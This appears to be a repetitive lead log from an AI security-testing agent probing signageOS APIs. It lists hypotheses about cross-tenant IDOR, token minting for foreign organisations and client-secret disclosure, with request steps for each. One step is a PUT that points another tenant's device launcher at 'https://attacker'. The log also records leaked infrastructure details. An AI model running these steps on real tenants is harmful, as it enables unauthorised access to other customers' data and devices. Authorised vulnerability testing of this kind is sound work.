# LEADS bigpickle (seed)
- SEED: no model output yet.
## 2026-08-07 18:29:41 UTC [box] (model bigpickle)
## 2026-08-07 18:50:25 UTC [box] (model bigpickle)
[HYP] Cross-tenant IDOR via organizationUid on api.signageos.io /v1
class: IDOR
asset: api.signageos.io/v1/{device,organization,alert,...}
confidence: 60
reasoning: 19 routes confirmed present (403-only, no auth header). SDK appends `organizationUid` query param to JWT calls and builds `apiUrl/version/resource`; JWT identifies account, UID selects tenant — if authorization is per-JWT and not re-checked per-UID, cross-org reads/writes are possible. Untestable without a token.
evidence_needed: valid `X-Auth` JWT + observed 200 vs 403 for a foreign `organizationUid`.
verify_steps: AUTH_HELPED: with a box-generated token, `GET https://api.signageos.io/v1/device` (own org), then `GET /v1/device?organizationUid=<other-org-uid>` and `GET /v1/organization/<foreign-uid>` — any non-403 is a finding.
impact: cross-tenant device/org data disclosure and manipulation; CRITICAL
testability: AUTH_HELPED
[HYP] Device-scoped endpoint auth weaker than user JWT on telemetry/alive/peer-recovery
class: AUTH
asset: api.signageos.io/v1/device/{uid}/telemetry/latest
confidence: 45
reasoning: device-side resources (`telemetry/latest`, `device/{uid}/alive`, `peer-recovery`) may accept device tokens or no-auth in device onboarding path; `device/telemetry/latest` confirmed 403 today but subresource matrix unprobed.
evidence_needed: any `/v1/device/*` subresource returning ≠403 unauthenticated.
verify_steps: PASSIVE: `GET /v1/device/<uid>/alive`, `/v1/device/<uid>/peer-recovery`, `/v1/device/<uid>/organization` (no header) — 403 confirms route, 200/401-with-different-error hints alternate auth.
impact: unauthenticated device state/telemetry read; MEDIUM
testability: PASSIVE
[HYP] Box dashboard token-generation surface over-scopes API credentials
class: AUTH
asset: box.signageos.io/settings
confidence: 45
reasoning: CLI docs direct users to `box.signageos.io/settings` to mint `SOS_API_IDENTIFICATION`/`SOS_API_SECURITY_TOKEN`; box is in-scope and CSP `connect-src` includes `api.signageos.io`, so box is the token minting origin. If minted tokens lack scope/expiry constraints, any XSS/CSRF on box amplifies to full API.
evidence_needed: authenticated inspection of the token-minting XHR (scopes, expiry, org binding).
verify_steps: AUTH_HELPED: login to box, observe XHR to `api.signageos.io/v1/*` from box origin in devtools, test whether minted token honors `organizationUid` and expiry.
impact: over-scoped long-lived API creds enabling cross-org access; HIGH
testability: AUTH_HELPED
[PARKED] Auth0 redirect_uri validation bypass @ box/login: no longer actionable — Auth0 tenant-side allowlist, not testable passively (already learned).
[PARKED] JWT audience=Auth0 Management API v2 confusion: audience string is public but minting a Management-API token requires tenant credentials; no passive POC. confidence <45.
[FINAL] 1) Cross-tenant IDOR via organizationUid (60, AUTH_HELPED)  2) Device-scoped endpoint auth bypass (45, PASSIVE)  3) Box token-generation over-scope (45, AUTH_HELPED)
[NEXT] RAG: fetch public REST-API docs `https://docs.signageos.io/hc/en-us/articles/4405231278482` (REST APIs) and `https://docs.signageos.io/hc/en-us/articles/4405239033234` (REST-API-Authentication) to extract the complete v1/v2 endpoint catalog + any unauthenticated/token-less endpoints, then re-probe only non-403 candidates on api.signageos.io.
[RISK] box.signageos.io: 72 — Auth0 OAuth2 dashboard, API-token minting origin, broad CSP trust boundary (20+ origins incl. device/upload/remote-desktop APIs); exposure stable.
[RISK] api.signageos.io: 78 — previously dismissed as "no surface", now confirmed versioned JWT API (19+ routes, device-management data, cross-tenant IDOR potential); risk materially raised.
## 2026-08-07 19:19:23 UTC [box] (model bigpickle)
## 2026-08-07 20:07:10 UTC [box] (model bigpickle)
[HYP] Cross-tenant org-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 55
reasoning: Spec marks this XAuthAccount-only; org UID is a path key. Account token scopes to a Company, yet docs say one account token "can create multiple organizations" and mint org tokens. If company-membership is not re-checked per UID, any account token mints tokens for any org, and org tokens fully control devices (brightness/firmware/content/timing).
evidence_needed: 200 (not 403) on the foreign-UID path with own account token.
verify_steps: AUTH_HELPED: `GET https://api.signageos.io/v1/organization/<own-org>/security-token` (baseline 200), then `GET /v1/organization/<foreign-org-uid>/security-token` — 200 = cross-tenant token mint → full device control of foreign org.
impact: mint org tokens for any tenant → device/content/timing takeover; CRITICAL
testability: AUTH_HELPED
[HYP] Account-token filtered listing ignores tenant scope (organizationUid/companyUid)
class: IDOR
asset: api.signageos.io/v1/organization (GET), /v1/emulator (GET), /v1/device (GET)
confidence: 50
reasoning: account-token listing endpoints take `organizationUid(s)`/`companyUid` as free filters; docs explicitly require organizationUid for org-scoped listing with account tokens. If the filter is applied without a "filter ∈ my company" check, account tokens read foreign tenants' org/device/emulator data.
evidence_needed: 200 with non-empty foreign data for a foreign uid filter.
verify_steps: AUTH_HELPED: `GET /v1/organization?companyUid=<foreign>` and `GET /v1/device?organizationUid=<foreign>` with own account token — non-403/empty is a finding.
impact: cross-tenant device/org/telemetry disclosure; HIGH
testability: AUTH_HELPED
[HYP] Credentials exposed in query string on account-token mint
class: MISCONFIG
asset: api.signageos.io/v1/account/security-token (POST/DELETE)
confidence: 45
reasoning: `identification` + `password` defined as **query** params (spec) on a POST behind CloudFront — user credentials land in URL logs/referrers; alternate auth path bypasses normal session flow.
evidence_needed: confirmed CloudFront/access-log capture of query creds (infra-side, not provable passively) + spec-level confirmation of param location.
verify_steps: AUTH_HELPED: with org token, POST `/v1/account/security-token?identification=<u>&password=<p>` and inspect request/response + any logging headers.
impact: credential leakage via shared-infra logs; MEDIUM
testability: AUTH_HELPED
[NEXT] RAG: fetch `github.com/signageos/sdk` source to confirm exact `X-Auth` construction for v1/v2, the account-token mint call shape (`identification`/`password` param placement), and whether `createApiV2` reuses v1 auth/orgUid semantics — converts hypothesis 1/2 into exact AUTH_HELPED test recipes.
## 2026-08-07 20:56:31 UTC [box] (model bigpickle)
[HYP] Cross-tenant peer-recovery read/write via legacy client-secret not bound to target device UID
class: IDOR
asset: api.signageos.io/v1/device/{uid}/peer-recovery (GET list / PUT set)
confidence: 55
reasoning: gate is org client-secret (`403083 MISSING_CLIENT_SECRET`), not JWT; SDK takes deviceUid as an arbitrary path arg (DevicePeerRecoveryManagement.ts:22,36); org-context is client-controlled (`X-Auth: clientId:secret`, or `?organizationUid=` for JWT), so the server-side org→device binding is the only barrier.
evidence_needed: with own org `X-Auth: clientId:secret`, GET/PUT peer-recovery against a device UID belonging to another org returns 200 (not 403).
verify_steps: AUTH_HELPED: `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` baseline 200; repeat with foreign device UID → 200 = cross-tenant; then `PUT` with `{"enabled":true,"urlLauncherAddress":"https://attacker"}` to confirm write.
impact: read + overwrite peer-recovery config on any tenant's devices; PUT can point device launcher at attacker URL → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token + client-supplied organizationUid
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 60
reasoning: docs state one account token can create multiple orgs and mint org tokens; SDK builds `organization/<uid>/security-token` (path = resource key) while JWT auth-context is a separate client-supplied `?organizationUid=` (requester.ts:41-44); if path-UID membership vs query-UID is not re-checked server-side, any account token mints tokens for any org.
evidence_needed: non-403 on POST/GET `/v1/organization/<foreign-uid>/security-token` with own account JWT.
verify_steps: AUTH_HELPED: `GET /v1/organization/<own>/security-token` baseline 200; then `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; minted org token should then drive foreign devices (brightness/firmware/content/timing).
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] v2 API partial-migration authz drift (route exists in v2, alternate/weaker auth)
class: AUTH
asset: api.signageos.io/v2/*
confidence: 45
reasoning: /v2/device is JWT-gated (403 WRONG_JWT) but /v2/account and /v2/organization are 404 — v2 is a selective port; freshly-migrated code paths commonly diverge on authorization checks; IOptions is version-agnostic (legacy clientId:secret works across v1/v2).
evidence_needed: any /v2 route returning 200 unauthenticated, or ≠403/404, or accepting legacy auth where v1 requires JWT.
verify_steps: PASSIVE: probe /v2/device/{uid}, /v2/license, /v2/alert, /v2/location, /v2/content, /v2/bulk-operation, /v2/emulator without auth — anything ≠403/404 is a finding; AUTH_HELPED: compare own-creds response on same resource across /v1 vs /v2.
impact: authz drift → data disclosure / cross-tenant access via an alternate code path; HIGH
testability: PASSIVE
## 2026-08-07 21:34:01 UTC [box] (model bigpickle)
[HYP] Cross-tenant IDOR via organizationUid on api.signageos.io /v1
class: IDOR
asset: api.signageos.io/v1/{device,organization,alert,...}
confidence: 60
reasoning: 19 routes confirmed present (403-only, no auth header). SDK appends `organizationUid` query param to JWT calls and builds `apiUrl/version/resource`; JWT identifies account, UID selects tenant — if authorization is per-JWT and not re-checked per-UID, cross-org reads/writes are possible. Untestable without a token.
evidence_needed: valid `X-Auth` JWT + observed 200 vs 403 for a foreign `organizationUid`.
verify_steps: AUTH_HELPED: with a box-generated token, `GET https://api.signageos.io/v1/device` (own org), then `GET /v1/device?organizationUid=<other-org-uid>` and `GET /v1/organization/<foreign-uid>` — any non-403 is a finding.
impact: cross-tenant device/org data disclosure and manipulation; CRITICAL
testability: AUTH_HELPED
[HYP] Device-scoped endpoint auth weaker than user JWT on telemetry/alive/peer-recovery
class: AUTH
asset: api.signageos.io/v1/device/{uid}/telemetry/latest
confidence: 45
reasoning: device-side resources (`telemetry/latest`, `device/{uid}/alive`, `peer-recovery`) may accept device tokens or no-auth in device onboarding path; `device/telemetry/latest` confirmed 403 today but subresource matrix unprobed.
evidence_needed: any `/v1/device/*` subresource returning ≠403 unauthenticated.
verify_steps: PASSIVE: `GET /v1/device/<uid>/alive`, `/v1/device/<uid>/peer-recovery`, `/v1/device/<uid>/organization` (no header) — 403 confirms route, 200/401-with-different-error hints alternate auth.
impact: unauthenticated device state/telemetry read; MEDIUM
testability: PASSIVE
[HYP] Box dashboard token-generation surface over-scopes API credentials
class: AUTH
asset: box.signageos.io/settings
confidence: 45
reasoning: CLI docs direct users to `box.signageos.io/settings` to mint `SOS_API_IDENTIFICATION`/`SOS_API_SECURITY_TOKEN`; box is in-scope and CSP `connect-src` includes `api.signageos.io`, so box is the token minting origin. If minted tokens lack scope/expiry constraints, any XSS/CSRF on box amplifies to full API.
evidence_needed: authenticated inspection of the token-minting XHR (scopes, expiry, org binding).
verify_steps: AUTH_HELPED: login to box, observe XHR to `api.signageos.io/v1/*` from box origin in devtools, test whether minted token honors `organizationUid` and expiry.
impact: over-scoped long-lived API creds enabling cross-org access; HIGH
testability: AUTH_HELPED
[PARKED] Auth0 redirect_uri validation bypass @ box/login: no longer actionable — Auth0 tenant-side allowlist, not testable passively (already learned).
[PARKED] JWT audience=Auth0 Management API v2 confusion: audience string is public but minting a Management-API token requires tenant credentials; no passive POC. confidence <45.
[FINAL] 1) Cross-tenant IDOR via organizationUid (60, AUTH_HELPED)  2) Device-scoped endpoint auth bypass (45, PASSIVE)  3) Box token-generation over-scope (45, AUTH_HELPED)
[NEXT] RAG: fetch public REST-API docs `https://docs.signageos.io/hc/en-us/articles/4405231278482` (REST APIs) and `https://docs.signageos.io/hc/en-us/articles/4405239033234` (REST-API-Authentication) to extract the complete v1/v2 endpoint catalog + any unauthenticated/token-less endpoints, then re-probe only non-403 candidates on api.signageos.io.
[RISK] box.signageos.io: 72 — Auth0 OAuth2 dashboard, API-token minting origin, broad CSP trust boundary (20+ origins incl. device/upload/remote-desktop APIs); exposure stable.
[RISK] api.signageos.io: 78 — previously dismissed as "no surface", now confirmed versioned JWT API (19+ routes, device-management data, cross-tenant IDOR potential); risk materially raised.
[HYP] Cross-tenant org-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 55
reasoning: Spec marks this XAuthAccount-only; org UID is a path key. Account token scopes to a Company, yet docs say one account token "can create multiple organizations" and mint org tokens. If company-membership is not re-checked per UID, any account token mints tokens for any org, and org tokens fully control devices (brightness/firmware/content/timing).
evidence_needed: 200 (not 403) on the foreign-UID path with own account token.
verify_steps: AUTH_HELPED: `GET https://api.signageos.io/v1/organization/<own-org>/security-token` (baseline 200), then `GET /v1/organization/<foreign-org-uid>/security-token` — 200 = cross-tenant token mint → full device control of foreign org.
impact: mint org tokens for any tenant → device/content/timing takeover; CRITICAL
testability: AUTH_HELPED
[HYP] Account-token filtered listing ignores tenant scope (organizationUid/companyUid)
class: IDOR
asset: api.signageos.io/v1/organization (GET), /v1/emulator (GET), /v1/device (GET)
confidence: 50
reasoning: account-token listing endpoints take `organizationUid(s)`/`companyUid` as free filters; docs explicitly require organizationUid for org-scoped listing with account tokens. If the filter is applied without a "filter ∈ my company" check, account tokens read foreign tenants' org/device/emulator data.
evidence_needed: 200 with non-empty foreign data for a foreign uid filter.
verify_steps: AUTH_HELPED: `GET /v1/organization?companyUid=<foreign>` and `GET /v1/device?organizationUid=<foreign>` with own account token — non-403/empty is a finding.
impact: cross-tenant device/org/telemetry disclosure; HIGH
testability: AUTH_HELPED
[HYP] Credentials exposed in query string on account-token mint
class: MISCONFIG
asset: api.signageos.io/v1/account/security-token (POST/DELETE)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid} (GET)
confidence: 65
reasoning: SDK fetches an org's oauthClientId/oauthClientSecret using only ACCOUNT auth (sosControlHelper.ts:130-136 → organizationManagement.get(uid) with accountDI; RestApi.ts:65). If server does not verify account∈company→org, any account token reads any org's full API credential.
evidence_needed: `GET /v1/organization/<foreign-uid>` with own account token returns 200 containing `oauthClientSecret`.
verify_steps: AUTH_HELPED: `GET /v1/organization/<own-org> -H "X-Auth: <ownId>:<ownToken>"` baseline 200; repeat with foreign org UID → 200 = cross-tenant credential disclosure; then use leaked secret as org X-Auth on `/v1/device`.
impact: obtain any tenant's org API credential → full device/content/timing/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org-token minting via account credentials on security-token endpoint
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 60
reasoning: live gate is account-scoped (403074/403076, accepts x-oauth-client_id/secret or X-Auth id:secret), not JWT nor org-scoped; SDK builds `organization/<uid>/security-token` with the same account auth (OrganizationTokenManagement.ts:29-32). Cross-tenant iff path-UID is not bound to the authenticated account's company.
evidence_needed: with own account creds, `GET /v1/organization/<foreign-uid>/security-token` returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign UID → 200 = cross-tenant; `POST {"name":"x"}` mints a working org token.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant peer-recovery write via legacy org client-secret (device UID not bound to org)
class: IDOR
asset: api.signageos.io/v1/device/{uid}/peer-recovery (GET/PUT), /brightness, /resolution
confidence: 55
reasoning: only these device subresources are client-secret-gated (403083/403075) instead of JWT (403105); deviceUid is a client-supplied path arg; org is derived only from X-Auth credential, so org→device membership is the sole barrier.
evidence_needed: with own org X-Auth, `GET/PUT /v1/device/<foreign-uid>/peer-recovery` returns 200.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign UID → 200 = cross-tenant; `PUT {"enabled":true,"urlLauncherAddress":"https://attacker"}` confirms write.
impact: read/overwrite any tenant's device recovery launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
## 2026-08-07 22:07:19 UTC [box] (model bigpickle)
[HYP] Cross-tenant IDOR via organizationUid on api.signageos.io /v1
class: IDOR
asset: api.signageos.io/v1/{device,organization,alert,...}
confidence: 60
reasoning: 19 routes confirmed present (403-only, no auth header). SDK appends `organizationUid` query param to JWT calls and builds `apiUrl/version/resource`; JWT identifies account, UID selects tenant — if authorization is per-JWT and not re-checked per-UID, cross-org reads/writes are possible. Untestable without a token.
evidence_needed: valid `X-Auth` JWT + observed 200 vs 403 for a foreign `organizationUid`.
verify_steps: AUTH_HELPED: with a box-generated token, `GET https://api.signageos.io/v1/device` (own org), then `GET /v1/device?organizationUid=<other-org-uid>` and `GET /v1/organization/<foreign-uid>` — any non-403 is a finding.
impact: cross-tenant device/org data disclosure and manipulation; CRITICAL
testability: AUTH_HELPED
[HYP] Device-scoped endpoint auth weaker than user JWT on telemetry/alive/peer-recovery
class: AUTH
asset: api.signageos.io/v1/device/{uid}/telemetry/latest
confidence: 45
reasoning: device-side resources (`telemetry/latest`, `device/{uid}/alive`, `peer-recovery`) may accept device tokens or no-auth in device onboarding path; `device/telemetry/latest` confirmed 403 today but subresource matrix unprobed.
evidence_needed: any `/v1/device/*` subresource returning ≠403 unauthenticated.
verify_steps: PASSIVE: `GET /v1/device/<uid>/alive`, `/v1/device/<uid>/peer-recovery`, `/v1/device/<uid>/organization` (no header) — 403 confirms route, 200/401-with-different-error hints alternate auth.
impact: unauthenticated device state/telemetry read; MEDIUM
testability: PASSIVE
[HYP] Box dashboard token-generation surface over-scopes API credentials
class: AUTH
asset: box.signageos.io/settings
confidence: 45
reasoning: CLI docs direct users to `box.signageos.io/settings` to mint `SOS_API_IDENTIFICATION`/`SOS_API_SECURITY_TOKEN`; box is in-scope and CSP `connect-src` includes `api.signageos.io`, so box is the token minting origin. If minted tokens lack scope/expiry constraints, any XSS/CSRF on box amplifies to full API.
evidence_needed: authenticated inspection of the token-minting XHR (scopes, expiry, org binding).
verify_steps: AUTH_HELPED: login to box, observe XHR to `api.signageos.io/v1/*` from box origin in devtools, test whether minted token honors `organizationUid` and expiry.
impact: over-scoped long-lived API creds enabling cross-org access; HIGH
testability: AUTH_HELPED
[PARKED] Auth0 redirect_uri validation bypass @ box/login: no longer actionable — Auth0 tenant-side allowlist, not testable passively (already learned).
[PARKED] JWT audience=Auth0 Management API v2 confusion: audience string is public but minting a Management-API token requires tenant credentials; no passive POC. confidence <45.
[FINAL] 1) Cross-tenant IDOR via organizationUid (60, AUTH_HELPED)  2) Device-scoped endpoint auth bypass (45, PASSIVE)  3) Box token-generation over-scope (45, AUTH_HELPED)
[NEXT] RAG: fetch public REST-API docs `https://docs.signageos.io/hc/en-us/articles/4405231278482` (REST APIs) and `https://docs.signageos.io/hc/en-us/articles/4405239033234` (REST-API-Authentication) to extract the complete v1/v2 endpoint catalog + any unauthenticated/token-less endpoints, then re-probe only non-403 candidates on api.signageos.io.
[RISK] box.signageos.io: 72 — Auth0 OAuth2 dashboard, API-token minting origin, broad CSP trust boundary (20+ origins incl. device/upload/remote-desktop APIs); exposure stable.
[RISK] api.signageos.io: 78 — previously dismissed as "no surface", now confirmed versioned JWT API (19+ routes, device-management data, cross-tenant IDOR potential); risk materially raised.
[HYP] Cross-tenant org-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 55
reasoning: Spec marks this XAuthAccount-only; org UID is a path key. Account token scopes to a Company, yet docs say one account token "can create multiple organizations" and mint org tokens. If company-membership is not re-checked per UID, any account token mints tokens for any org, and org tokens fully control devices (brightness/firmware/content/timing).
evidence_needed: 200 (not 403) on the foreign-UID path with own account token.
verify_steps: AUTH_HELPED: `GET https://api.signageos.io/v1/organization/<own-org>/security-token` (baseline 200), then `GET /v1/organization/<foreign-org-uid>/security-token` — 200 = cross-tenant token mint → full device control of foreign org.
impact: mint org tokens for any tenant → device/content/timing takeover; CRITICAL
testability: AUTH_HELPED
[HYP] Account-token filtered listing ignores tenant scope (organizationUid/companyUid)
class: IDOR
asset: api.signageos.io/v1/organization (GET), /v1/emulator (GET), /v1/device (GET)
confidence: 50
reasoning: account-token listing endpoints take `organizationUid(s)`/`companyUid` as free filters; docs explicitly require organizationUid for org-scoped listing with account tokens. If the filter is applied without a "filter ∈ my company" check, account tokens read foreign tenants' org/device/emulator data.
evidence_needed: 200 with non-empty foreign data for a foreign uid filter.
verify_steps: AUTH_HELPED: `GET /v1/organization?companyUid=<foreign>` and `GET /v1/device?organizationUid=<foreign>` with own account token — non-403/empty is a finding.
impact: cross-tenant device/org/telemetry disclosure; HIGH
testability: AUTH_HELPED
[HYP] Credentials exposed in query string on account-token mint
class: MISCONFIG
asset: api.signageos.io/v1/account/security-token (POST/DELETE)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid} (GET)
confidence: 65
reasoning: SDK fetches an org's oauthClientId/oauthClientSecret using only ACCOUNT auth (sosControlHelper.ts:130-136 → organizationManagement.get(uid) with accountDI; RestApi.ts:65). If server does not verify account∈company→org, any account token reads any org's full API credential.
evidence_needed: `GET /v1/organization/<foreign-uid>` with own account token returns 200 containing `oauthClientSecret`.
verify_steps: AUTH_HELPED: `GET /v1/organization/<own-org> -H "X-Auth: <ownId>:<ownToken>"` baseline 200; repeat with foreign org UID → 200 = cross-tenant credential disclosure; then use leaked secret as org X-Auth on `/v1/device`.
impact: obtain any tenant's org API credential → full device/content/timing/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org-token minting via account credentials on security-token endpoint
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 60
reasoning: live gate is account-scoped (403074/403076, accepts x-oauth-client_id/secret or X-Auth id:secret), not JWT nor org-scoped; SDK builds `organization/<uid>/security-token` with the same account auth (OrganizationTokenManagement.ts:29-32). Cross-tenant iff path-UID is not bound to the authenticated account's company.
evidence_needed: with own account creds, `GET /v1/organization/<foreign-uid>/security-token` returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign UID → 200 = cross-tenant; `POST {"name":"x"}` mints a working org token.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant peer-recovery write via legacy org client-secret (device UID not bound to org)
class: IDOR
asset: api.signageos.io/v1/device/{uid}/peer-recovery (GET/PUT), /brightness, /resolution
confidence: 55
reasoning: only these device subresources are client-secret-gated (403083/403075) instead of JWT (403105); deviceUid is a client-supplied path arg; org is derived only from X-Auth credential, so org→device membership is the sole barrier.
evidence_needed: with own org X-Auth, `GET/PUT /v1/device/<foreign-uid>/peer-recovery` returns 200.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign UID → 200 = cross-tenant; `PUT {"enabled":true,"urlLauncherAddress":"https://attacker"}` confirms write.
impact: read/overwrite any tenant's device recovery launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[PRIO] api.signageos.io/v1/organization/{uid}/security-token: 7.80 (attack=9, business=10, tech=8, gate=3, cloud=8, fresh=8) — Cross-tenant org-token minting via account token; JWT-gated but high-value logic flaw if org UID not re-checked
[PRIO] api.signageos.io/v1/device/{uid}/peer-recovery: 7.55 (attack=8, business=9, tech=8, gate=3, cloud=8, fresh=8) — Legacy client-secret auth (X-Auth) not bound to target device UID; SDK takes arbitrary deviceUid path arg
[PRIO] api.signageos.io/v2/*: 6.65 (attack=7, business=8, tech=7, gate=10, cloud=7, fresh=7) — Partial v2 migration; /v2/device JWT-gated but /v2/account, /v2/organization 404; authz drift candidate, PASSIVE testable
[PRIO] box.signageos.io/status: 6.25 (attack=5, business=6, tech=5, gate=10, cloud=7, fresh=6) — Already accepted MISCONFIG; infra recon value for SSRF/logic-flaw chaining
[PRIO] remote-desktop.signageos.io / upload.signageos.io: 5.90 (attack=6, business=7, tech=6, gate=10, cloud=6, fresh=6) — Identical Express HTML (shared infra); CSP frame-src from box; postMessage boundary unprobed
[HYP] Cross-tenant org security-token minting via account token + client-supplied organizationUid
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 60
reasoning: Docs state one account token can create multiple orgs and mint org tokens; SDK builds `organization/<uid>/security-token` (path = resource key) while JWT auth-context is a separate client-supplied `?organizationUid=` query param; if path-UID membership vs query-UID is not re-checked server-side, any account token mints tokens for any org
evidence_needed: non-403 on POST/GET `/v1/organization/<foreign-uid>/security-token` with own account JWT
verify_steps: AUTH_HELPED: `GET /v1/organization/<own>/security-token` baseline 200; then `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; minted org token should then drive foreign devices (brightness/firmware/content/timing)
impact: mint org tokens for any tenant → full foreign-device control (brightness, firmware, content, timing); CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant peer-recovery read/write via legacy client-secret not bound to target device UID
class: IDOR
asset: api.signageos.io/v1/device/{uid}/peer-recovery (GET list / PUT set)
confidence: 55
reasoning: Gate is org client-secret (`403083 MISSING_CLIENT_SECRET`), not JWT; SDK takes deviceUid as arbitrary path arg; org-context is client-controlled (`X-Auth: clientId:secret` or `?organizationUid=` for JWT), so server-side org→device binding is the only barrier
evidence_needed: with own org `X-Auth: clientId:secret`, GET/PUT peer-recovery against a device UID belonging to another org returns 200 (not 403)
verify_steps: AUTH_HELPED: `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` baseline 200; repeat with foreign device UID → 200 = cross-tenant; then `PUT` with `{"enabled":true,"urlLauncherAddress":"https://attacker"}` to confirm write
impact: read + overwrite peer-recovery config on any tenant's devices; PUT can point device launcher at attacker URL → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[HYP] v2 API partial-migration authz drift (route exists in v2, alternate/weaker auth)
class: AUTH
asset: api.signageos.io/v2/*
confidence: 45
reasoning: /v2/device is JWT-gated (403 WRONG_JWT) but /v2/account and /v2/organization are 404 — v2 is a selective port; freshly-migrated code paths commonly diverge on authorization checks; IOptions is version-agnostic (legacy clientId:secret works across v1/v2)
evidence_needed: any /v2 route returning 200 unauthenticated, or ≠403/404, or accepting legacy auth where v1 requires JWT
verify_steps: PASSIVE: probe /v2/device/{uid}, /v2/license, /v2/alert, /v2/location, /v2/content, /v2/bulk-operation, /v2/emulator without auth — anything ≠403/404 is a finding; AUTH_HELPED: compare own-creds response on same resource across /v1 vs /v2
impact: authz drift → data disclosure / cross-tenant access via an alternate code path; HIGH
testability: PASSIVE
[PARKED] (none dropped — all confidence ≥40, no rejected classes, all have concrete verify_steps)
[FINAL] (re-ranked, top first):
[NEXT] RAG: Clone `github.com/signageos/sdk` and grep `src/api/` + `src/auth/` + `src/requester.ts` for: (1) exact `X-Auth` header construction (`id:unsafeDecryptedToken` format) for v1/v2; (2) account-token mint call shape (`identification`/`password` param placement — query vs body); (3) whether `createApiV2` reuses v1 auth/orgUid semantics; (4) any `/v2/` endpoint invoked without JWT at initialization (pre-auth bypass candidate) — converts hypotheses 1/2/3 into exact AUTH_HELD/PASSIVE test recipes
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Confirmed live. Unauthenticated GET returns application/json leaking K8s pod hostname (rotating: gkzcp → mtnct), process UID, Node v20.20.2, and service topology (amqp0, redis0-3, mongoDB0-3). Not on rejected list.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Confirmed live. 18 static ACAO values on / (302) + /login/ (200), unchanged under spoofed Origin `https://evil.test`. Includes `http://` variant + `https://*.zdusercontent.com` wildcard + sibling `api.signageos.io`. No `Access-Control-Allow-Credentials` on any box path. api.signageos.io has NO ACAO on any path (including /status, /v1/*, /v2/*).
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Confirmed live. /login/ CSP broadened vs / (triplicated Auth0 oauth/token, additional recaptcha frame-src). 40+ connect-src/frame-src origins spanning Auth0, Sony/BroadSign/MoodMedia device APIs, S3 buckets, AWS API Gateway, and api.signageos.io.
[LEARN] REJECTED MISCONFIG @ box.signageos.io /ready: Returns 200 `OK` (2 bytes) — trivial health check, no data leaked. Not reportable.
[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: All 60+ endpoints return 403 JWT-gated (WRONG_JWT_TOKEN/403105). No pre-auth bypass. Dual auth confirmed: JWT Bearer (main API) + X-Auth API-key format (`id:unsafeDecryptedToken`) for bulk provisioning.
[LEARN] REJECTED MISCONFIG @ api.signageos.io CORS: 403/404 carry `vary: Origin` + `access-control-expose-headers: *` but NO ACAO under any Origin — not CORS-exploitable.
[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 redirect_uri validation — not testable passively without tenant config access (carried forward).
[LEARN] REJECTED AUTH @ box.signageos.io/login: login CSRF via OAuth2 state — excluded per "CSRF on anonymous-accessible forms" (carried forward).
[LEARN] REJECTED MISCONFIG @ api.signageos.io/v1/* descriptive errors: 403 body leaks `"Account not found"`, `"Decoding of provided JWT token has failed"`, `errorCode 403105` — falls under descriptive error messages (excluded).
[RISK] box.signageos.io: 58 — Unauthenticated `/status` info leak (pod hostname + Redis/MongoDB/AMQP topology + Node version); CORS ACAO whitelist with 18 origins (incl HTTP variant + zdusercontent wildcard); broad CSP (40+ origins). Everything except `/status`, `/login/`, `/ready`, `/assets/*` redirects to Auth0 login. Moderate operational exposure, no direct data access without credentials.
[RISK] api.signageos.io: 47 — Unauthenticated `/status` info leak (pod hostname + service topology); 60+ `/v1/*`+`/`v2/*` endpoints all solidly JWT-gated (403 without token); no CORS issues; static HTML landing on `/`. Lower data-exposure risk — main concern is infra recon aid for the JWT-gated high-value API (devices, organizations, accounts, content).
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 65
reasoning: Spec v50.4.0 documents this op as both-scheme (XAuthAccount accepted) with 200 body containing oauthClientId+oauthClientSecret; SDK fetches it with account-only auth. Account token is user-mintable in Box (settings/profile). Only barrier left is server-side account∈company→org re-check per path UID.
evidence_needed: own account token → 200 (not 403/404) on `GET /v1/organization/<foreign-org-uid>` returning oauthClientSecret.
